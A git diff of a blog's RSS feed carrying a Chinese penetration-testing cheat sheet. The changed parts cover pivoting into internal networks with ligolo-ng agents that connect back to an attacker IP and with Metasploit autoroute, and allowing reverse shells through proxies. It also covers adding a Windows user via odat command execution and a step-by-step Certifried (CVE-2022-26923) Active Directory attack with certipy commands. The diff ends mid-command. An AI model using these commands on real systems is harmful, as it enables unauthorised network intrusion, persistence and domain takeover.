@@ -12,8 +12,8 @@
         <pubDate>Fri, 31 Oct 2025 19:40:56 +0800</pubDate>
         
         <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
-        <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
-&lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
+        <description>&lt;p&gt;ntp方式# 信息收集-枚举&lt;/p&gt;
+&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
 &lt;/h3&gt;&lt;p&gt;nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb ip --generate-hosts-file hostname
@@ -1023,36 +1023,7 @@ nxc&lt;/p&gt;
 &lt;p&gt;取消代理&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wg-socks &lt;span style=&#34;color:#75715e&#34;&gt;# 查看存活代理id&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wg-socks stop &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;tun流量虚拟网卡适合一级内网&#34;&gt;tun流量虚拟网卡（适合一级内网）
-&lt;/h2&gt;&lt;h3 id=&#34;ligolo-ng虚拟网卡反向&#34;&gt;ligolo-ng虚拟网卡(反向)
-&lt;/h3&gt;&lt;p&gt;如果只是想通过边界入侵一层内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains&lt;/p&gt;
-&lt;p&gt;ligolo的原理是搭建一条tun隧道，也就是建立一条虚拟网卡并指向指定路由，这种原理导致其十分稳定且好用，并且其只需要一个服务端就可以做到多个客户端连接并且切换使用路由的操作&lt;/p&gt;
-&lt;p&gt;前置操作-攻击机(kali)执行-创建虚拟网卡&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link del ligolo 2&amp;gt;/dev/null  &lt;span style=&#34;color:#75715e&#34;&gt;# 清理旧接口（可选）&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip tuntap add user &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;whoami&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; mode tun ligolo  &lt;span style=&#34;color:#75715e&#34;&gt;# 创建 TUN 设备&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set ligolo up             &lt;span style=&#34;color:#75715e&#34;&gt;# 启用接口&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip route add 10.0.52.0/24 dev ligolo  &lt;span style=&#34;color:#75715e&#34;&gt;# 添加路由规则.这里举例内网为10.0.52.0网段&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;启动代理服务端-攻击端kali执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./proxy -laddr 0.0.0.0:9001 -selfcert  &lt;span style=&#34;color:#75715e&#34;&gt;# 监听 9001 端口&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对目标上传客户端并且连接客户端&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./agent -connect 攻击机_IP:9001 -ignore-cert  &lt;span style=&#34;color:#75715e&#34;&gt;# 连接代理&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当连接成功后，我们能通过在服务端输入命令切换或者启动路由&lt;/p&gt;
-&lt;p&gt;启动路由&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ligolo-ng » session
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ligolo-ng » &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 输入对应的数字&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Agent : test@test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; » start
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 成功后会显示：INFO[xxxx] Starting tunnel to test@test&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果接入新的客户端需要连接新的网段&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;先链接新的客户端，或者当前客户端，之后直接添加新路由即可
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip route add 10.0.56.0/24 dev ligolo 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;不要删除原有的10.0.52.0路由，两者共存才能同时访问两个网段
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ligolo-ng虚拟网卡正向&#34;&gt;ligolo-ng虚拟网卡(正向)
-&lt;/h3&gt;&lt;p&gt;其余设置与反向一致，只是连接以agent充当服务器&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./agent -bind 0.0.0.0:9001
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;先进入ligolo，之后本地主动连接&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ligolo-ng » connect_agent --ip $入口机:9001
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后start即可&lt;/p&gt;
-&lt;h3 id=&#34;msf动态路由&#34;&gt;msf动态路由
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;msf动态路由&#34;&gt;msf动态路由
 &lt;/h3&gt;&lt;p&gt;msf的动态路由相当于一个专属于它自己的代理，当我们获取一个目标的msf载荷之后，可以直接配置动态路由来进行msf方便的内网入侵&lt;/p&gt;
 &lt;p&gt;这里我模拟我们搞到了一台内网session 1,其内网网段模拟为169.254.12.1,执行以下命令&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use post/multi/manage/autoroute
@@ -1120,7 +1091,63 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setg proxies socks5:127.0.0.1:6000
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并且如果这个时候我们需要反弹shell，msf会默认目标处于内网无法回弹，但是如果我们知道目标能访问到我们，我们可以直接使用下面的参数规避报错&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set ReverseAllowProxy true
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;提权or横向&#34;&gt;提权or横向
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tun流量虚拟网卡&#34;&gt;tun流量虚拟网卡
+&lt;/h3&gt;&lt;p&gt;如果只是想通过边界入侵内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains，并且ligolo的tun流量会将隧道实现最稳定的模式，远超socks流量&lt;/p&gt;
+&lt;p&gt;但经过测试，windows端的ligolo——proxy使用有很大问题，在配置winunl的情况下依旧无法连接流量，所以主控以linux为主&lt;/p&gt;
+&lt;p&gt;ligoli上线分为四步 1-上线，2-创建本地网卡，3-将tun流量绑定至网卡，4-清除网卡&lt;/p&gt;
+&lt;h4 id=&#34;1-上线&#34;&gt;1-上线
+&lt;/h4&gt;&lt;h5 id=&#34;ligolo-ng虚拟网卡反向连接&#34;&gt;ligolo-ng虚拟网卡(反向连接)
+&lt;/h5&gt;&lt;p&gt;启动代理服务端-攻击端kali执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./proxy -laddr 0.0.0.0:9001 -selfcert  &lt;span style=&#34;color:#75715e&#34;&gt;# 监听 9001 端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对目标上传客户端并且连接客户端&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./agent -connect 攻击机_IP:9001 -ignore-cert  &lt;span style=&#34;color:#75715e&#34;&gt;# 连接代理&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当连接成功后，我们能通过在服务端输入命令切换或者启动路由&lt;/p&gt;
+&lt;h5 id=&#34;ligolo-ng虚拟网卡正向&#34;&gt;ligolo-ng虚拟网卡(正向)
+&lt;/h5&gt;&lt;p&gt;其余设置与反向一致，只是连接以agent充当服务器，这里以被攻击机本地的9001监听&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./agent -bind 0.0.0.0:9001
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;启动代理服务端-攻击端kali执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./proxy -laddr 0.0.0.0:9001 -selfcert  &lt;span style=&#34;color:#75715e&#34;&gt;# 监听 9001 端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;```&lt;/span&gt;之后本地主动连接
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;```&lt;/span&gt;zsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ligolo-ng » connect_agent --ip $入口机:9001
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-创建网卡&#34;&gt;2-创建网卡
+&lt;/h4&gt;&lt;p&gt;创建网卡&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ifcreate --name $网卡名
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;删除网卡&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ifdel --name $网卡名
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-绑定流量&#34;&gt;3-绑定流量
+&lt;/h4&gt;&lt;p&gt;首先session选择目标agent，之后使用如下命令绑定网卡&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tunnel_start --tun $网卡名
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后使用ifconfig查看当前agent网段，例如&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Agent : root@webserver.aoseluauto.com&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; » ifconfig
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌────────────────────────────────────┐
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Interface &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                        │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├──────────────┬─────────────────────┤
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Name         │ lo                  │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Hardware MAC │                     │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ MTU          │ &lt;span style=&#34;color:#ae81ff&#34;&gt;65536&lt;/span&gt;               │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Flags        │ up|loopback|running │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ IPv4 Address │ 127.0.0.1/8         │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ IPv6 Address │ ::1/128             │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└──────────────┴─────────────────────┘
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌───────────────────────────────────────────────┐
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Interface &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;                                   │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;├──────────────┬────────────────────────────────┤
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Name         │ ens5                           │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Hardware MAC │ 00:16:3e:16:7e:47              │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ MTU          │ &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;                           │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ Flags        │ up|broadcast|multicast|running │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ IPv4 Address │ 172.16.53.30/16                │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;│ IPv6 Address │ fe80::216:3eff:fe16:7e47/64    │
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└──────────────┴────────────────────────────────┘
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将网段建立在这个路由上,跟具如上路由，命令如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route_add --name $网卡名 --route 172.16.53.30/16
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以通过route_list查看路由情况&lt;/p&gt;
+&lt;h4 id=&#34;注意&#34;&gt;注意
+&lt;/h4&gt;&lt;p&gt;请使用完毕务必删除网卡，否则会导致流量乱流&lt;/p&gt;
+&lt;h4 id=&#34;ligolo-ng多级网络思路&#34;&gt;ligolo-ng多级网络思路
+&lt;/h4&gt;&lt;p&gt;暂略&lt;/p&gt;
+&lt;h1 id=&#34;提权or横向&#34;&gt;提权or横向
 &lt;/h1&gt;&lt;h2 id=&#34;密码过期用户更改密码&#34;&gt;密码过期用户更改密码
 &lt;/h2&gt;&lt;p&gt;可以直接利用changepass.py更改，他调用的是rpcsmc接口允许跳过认证&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-changepasswd $domain/$user:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;@$ip -newpass wackMaker1!
@@ -1675,8 +1702,26 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果允许，可以执行命令，建议不要过长&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;odat dbmsscheduler -s $ip  -n $database   -U $user   -P $pass --sysdba --exec &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net user wackymaker wack1234! /add&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;域历史漏洞或者中继cve&#34;&gt;域历史漏洞或者中继（cve）
-&lt;/h2&gt;&lt;h3 id=&#34;nopac漏洞&#34;&gt;nopac漏洞
+&lt;/h2&gt;&lt;h3 id=&#34;certifriedcve-2022-26923证书漏洞&#34;&gt;Certifried(CVE-2022-26923)证书漏洞
 &lt;/h3&gt;&lt;h4 id=&#34;要求&#34;&gt;要求
+&lt;/h4&gt;&lt;p&gt;需要一个已经掌握的域用户，并且允许创建机器用户&lt;/p&gt;
+&lt;p&gt;需要2022年左右的adcs，检测是否存在逻辑如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy req -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$USER&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$DOMAIN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$PASSWORD&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -dc-ip &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$DC_IP&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -target &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ADCS_HOST&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -ca &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ca_name&amp;#39;&lt;/span&gt; -template &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果 Certipy 不打印Certificate object SID is [&amp;hellip;]获得证书后,就可以进行攻击。&lt;/p&gt;
+&lt;h4 id=&#34;攻击命令&#34;&gt;攻击命令
+&lt;/h4&gt;&lt;p&gt;创建机器用户,certipt会提供创建用户的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy account create -u $user -hashes $hash -user &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wack&amp;#34;&lt;/span&gt; -dc-ip $dc_ip  -dns $dns_fqdn
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注册dc机器证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certipy -debug req &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wack$@xiaorang.lab&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IjPxvp5AkgngsiNT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-ca $ca_fqdn &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-dc-ip $dc_ip &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-template &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Machine&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;-target $ca_ip
